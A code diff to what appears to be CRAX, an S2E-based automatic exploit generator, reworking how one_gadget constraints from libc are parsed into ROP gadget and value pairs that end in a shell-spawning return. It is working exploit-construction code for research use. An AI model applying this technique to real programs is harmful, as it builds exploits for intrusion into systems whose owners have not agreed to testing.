@@ -19,11 +19,11 @@
 // SOFTWARE.
 
 #include <s2e/Plugins/CRAX/CRAX.h>
+#include <s2e/Plugins/CRAX/Expr/Expr.h>
 #include <s2e/Plugins/CRAX/Utils/StringUtil.h>
 #include <s2e/Plugins/CRAX/Utils/Subprocess.h>
 
 #include <cassert>
-#include <regex>
 #include <utility>
 
 #include "OneGadget.h"
@@ -38,9 +38,9 @@ OneGadget::OneGadget() : Technique(), m_oneGadget() {
     bool canSatisfyAllConstraints = true;
 
     for (auto libcOneGadget : parseOneGadget()) {
-        for (const auto &gadgetAsm : libcOneGadget.gadgets) {
-            log<WARN>() << gadgetAsm << '\n';
-            if (!exploit.resolveGadget(libc, gadgetAsm)) {
+        for (const auto &gadget : libcOneGadget.gadgets) {
+            log<INFO>() << "Checking OneGadget constraint: " << gadget.first << '\n';
+            if (!exploit.resolveGadget(libc, gadget.first)) {
                 canSatisfyAllConstraints = false;
                 break;
             }
@@ -54,8 +54,8 @@ OneGadget::OneGadget() : Technique(), m_oneGadget() {
 
     assert(m_oneGadget.offset && "OneGadget technique is not viable.");
 
-    for (const auto &gadgetAsm : m_oneGadget.gadgets) {
-        m_requiredGadgets.push_back(std::make_pair(&libc, gadgetAsm));
+    for (const auto &gadget : m_oneGadget.gadgets) {
+        m_requiredGadgets.push_back(std::make_pair(&libc, gadget.first));
     }
 }
 
@@ -75,10 +75,10 @@ std::vector<RopSubchain> OneGadget::getRopSubchains() const {
     RopSubchain rop;
     rop.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
 
-    // Set all required registers to 0.
-    for (const auto &gadgetAsm : m_oneGadget.gadgets) {
-        rop.push_back(BaseOffsetExpr::create(exploit, libc, Exploit::toVarName(gadgetAsm)));
-        rop.push_back(ConstantExpr::create(0, Expr::Int64));
+    // Set all the required registers to the desired value.
+    for (const auto &gadget : m_oneGadget.gadgets) {
+        rop.push_back(BaseOffsetExpr::create(exploit, libc, Exploit::toVarName(gadget.first)));
+        rop.push_back(gadget.second);
     }
 
     // Return to the gadget, spawning a shell.
@@ -91,7 +91,7 @@ RopSubchain OneGadget::getExtraRopSubchain() const {
 }
 
 
-std::vector<OneGadget::LibcOneGadget> OneGadget::parseOneGadget() {
+std::vector<OneGadget::LibcOneGadget> OneGadget::parseOneGadget() const {
     const Exploit &exploit = g_crax->getExploit();
     const ELF &libc = exploit.getLibc();
 
@@ -124,15 +124,18 @@ std::vector<OneGadget::LibcOneGadget> OneGadget::parseOneGadget() {
             if (current.offset) {
                 ret.push_back(std::move(current));
             }
+
             std::vector<std::string> tokens = split(line, ' ');
             current.offset = std::stoull(tokens[0], nullptr, 16);
 
         } else if (!startsWith(line, "constraints:")) {
             // Parse the line.
             for (const auto &constraintStr : split(strip(line), " || ")) {
-                std::string gadgetAsm = parseConstraint(constraintStr);
-                if (gadgetAsm.size()) {
-                    current.gadgets.push_back(std::move(gadgetAsm));
+                GadgetValuePair gadget = parseConstraint(constraintStr);
+
+                if (gadget.first.size()) {
+                    current.gadgets.push_back(std::move(gadget));
+                    break;
                 }
             }
         }
@@ -142,27 +145,44 @@ std::vector<OneGadget::LibcOneGadget> OneGadget::parseOneGadget() {
     return ret;
 }
 
-std::string OneGadget::parseConstraint(const std::string &constraintStr) {
-    std::regex reg1("^[a-z0-9]* == NULL$");
-    std::regex reg2("^[[a-z0-9]*] == NULL$");
-    std::regex reg3("^[[a-z0-9]*\\+0[xX][a-f0-9]+] == NULL$");
-    std::regex reg4("^[a-z0-9]* is the GOT address of libc");
+OneGadget::GadgetValuePair OneGadget::parseConstraint(const std::string &constraintStr) const {
+    static const std::regex reg1("^[a-z0-9]* == NULL$");
+    static const std::regex reg2("^[[a-z0-9]*] == NULL$");
+    static const std::regex reg3("^[[a-z0-9]*\\+0[xX][a-f0-9]+] == NULL$");
+    static const std::regex reg4("^[a-z0-9]* is the GOT address of libc");
+
+    const Exploit &exploit = g_crax->getExploit();
+    const ELF &elf = exploit.getElf();
+
+    GadgetValuePair ret;
     std::smatch match;
 
     if (std::regex_match(constraintStr, match, reg1)) {
-        // e.g., rdx == NULL
+        // e.g., x == NULL
+        // Set the register x to 0.
         std::string reg = constraintStr.substr(0, constraintStr.find(' '));
-        return format("pop %s ; ret", reg.c_str());
+        ret.first = format("pop %s ; ret", reg.c_str());
+        ret.second = ConstantExpr::create(0, Expr::Int64);
+
     } else if (std::regex_match(constraintStr, match, reg2)) {
-        // e.g., [rdx] == NULL
+        // e.g., [x] == NULL
+        // Set the register x to some value where [x] == 0.
+        std::string reg = constraintStr.substr(1, constraintStr.find(']') - 1);
+        uint64_t offset = elf.checksec.hasPIE ? 8 : 0x400008;
+        ret.first = format("pop %s ; ret", reg.c_str());
+        ret.second = BaseOffsetExpr::create(elf, offset);
+
     } else if (std::regex_match(constraintStr, match, reg3)) {
-        // e.g., [rsp+0x40] == NULL
+        // e.g., [x+0x40] == NULL
+        // XXX: Implement this
+
     } else if (std::regex_match(constraintStr, match, reg4)) {
-        // e.g., rbx is the GOT address of libc
+        // e.g., x is the GOT address of libc
+        // XXX: Implement this
     }
 
     //log<WARN>() << "[OneGadget] unhandled constraint: " << constraintStr << '\n';
-    return "";
+    return ret;
 }
 
 }  // namespace s2e::plugins::crax
